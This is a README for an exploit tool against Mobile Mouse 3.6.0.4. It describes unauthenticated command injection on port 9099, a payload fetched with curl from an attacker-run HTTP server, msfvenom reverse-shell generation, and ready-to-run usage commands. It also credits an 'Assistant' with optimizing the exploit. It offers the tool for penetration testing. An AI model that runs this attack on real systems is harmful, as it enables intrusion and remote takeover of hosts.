# Mobile Mouse 3.6.0.4 RCE Exploit

Exploit by: [Chokri Hammedi](https://www.exploit-db.com/exploits/51010) (08/22)   
Fixed by: [lof1](https://github.com/lof1sec/mobile_mouse_rce/tree/main) (10/23)  
Updated by: x7331 (05/25)  
Optimized by: Assistant (2025)  

## Overview
This repository contains an exploit script targeting Mobile Mouse version 3.6.0.4, a remote control software for mobile devices. The exploit allows remote code execution (RCE) by leveraging an unauthenticated command injection vulnerability in the Mobile Mouse server running on port 9099.

## Original Exploit
The original exploit (dated August 9, 2022) works by uploading a crafted executable payload (usually generated manually via msfvenom) to the target machine's temporary directory and then remotely triggering its execution. The payload is served via an external HTTP server manually started by the attacker.

### What This Exploit Does
1. Connects to the Mobile Mouse service on the target IP (port 9099).
2. Sends crafted commands to upload a malicious payload (reverse shell executable) to the remote host.
3. Executes the uploaded payload, resulting in a reverse shell connection back to the attacker.
4. Requires an HTTP server serving the payload executable externally.

## Improvements & Optimizations

### Enhanced Features (Previous Updates)
1. **Integrated Payload Generation**: The script can now automatically generate the payload executable using msfvenom internally, removing the need to create the payload manually.
2. Uses a **temporary file to store the generated executable**, which is cleaned up after use.
3. **Built-in HTTP Server**: The script launches a background HTTP server to serve the generated (or user-supplied) payload. This removes the manual step of starting a separate HTTP server.

### Flexible Parameters:
Added command-line arguments to specify:

- `--target`: Target IP address (required)
- `--lhost`: Local IP for reverse shell callback (default: 127.0.0.1)
- `--lport`: Local port for reverse shell callback (default: 443)
- `--server-port`: Port number for the HTTP server serving the payload (default: 8080)
- `--payload`: Optional argument to provide a custom payload executable path
- `--verbose`: Enable verbose logging for debugging

### Improved Usage & Output:
* Structured logging with timestamps and log levels
* Clear console output for each major step and phase
* Better error handling and feedback
* Proper cleanup of temporary payload files
* Progress indicators for exploit phases

## How to Use

### Prerequisites
1. Python 3.6+ installed
2. `msfvenom` installed and available in your system path
3. Network connectivity to the target Mobile Mouse server on port `9099`

### Basic Usage
```bash
python3 mobile-mouse-rce.py --target <TARGET_IP> --lhost <YOUR_IP> --lport <YOUR_PORT>
```

### Advanced Usage Examples
```bash
# Basic exploit with auto-generated payload
python3 mobile-mouse-rce.py --target 192.168.1.100 --lhost 192.168.1.50 --lport 4444

# Using custom payload
python3 mobile-mouse-rce.py --target 10.0.0.5 --lhost 10.0.0.1 --lport 443 --payload /path/to/custom.exe

# Custom HTTP server port with verbose logging
python3 mobile-mouse-rce.py --target 172.16.0.10 --lhost 172.16.0.1 --lport 8080 --server-port 9090 --verbose
```

### What the Script Does
1. **Parameter Validation**: Validates all input parameters (IPs, ports, file paths)
2. **Payload Generation**: Automatically generates a reverse shell payload with `msfvenom` (if not provided)
3. **HTTP Server**: Starts a local HTTP server on the specified port to serve the payload
4. **Phase 1 - Download**: Connects to target and downloads the payload to `c:\Windows\Temp\`
5. **Phase 2 - Execute**: Reconnects and executes the downloaded payload
6. **Cleanup**: Automatically cleans up temporary files and stops the HTTP server

## Technical Details

### Exploit Flow
1. **Connection**: Establishes TCP connection to target on port 9099
2. **Authentication**: Sends connection and run commands using predefined hex patterns
3. **Command Injection**: Injects curl command to download payload from attacker's HTTP server
4. **Execution**: Injects command to execute the downloaded payload
5. **Reverse Shell**: Target connects back to attacker's listener

### Security Considerations
- The exploit targets an unauthenticated vulnerability
- Payload is downloaded to Windows temporary directory
- HTTP server includes security headers to prevent common attacks
- All temporary files are automatically cleaned up

## Disclaimer
This exploit is intended for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical.

## Changelog

### v3.0 (2025) - Major Optimization
- Complete code refactoring with object-oriented design
- Enhanced error handling and validation
- Improved logging and user experience
- Security improvements and better resource management
- Type hints and better code documentation

### v2.0 (2025) - Enhanced Features
- Integrated payload generation with msfvenom
- Built-in HTTP server functionality
- Improved command-line interface
- Better error handling and cleanup

### v1.0 (2022) - Original Exploit
- Basic RCE functionality
- Manual payload generation required
- External HTTP server needed
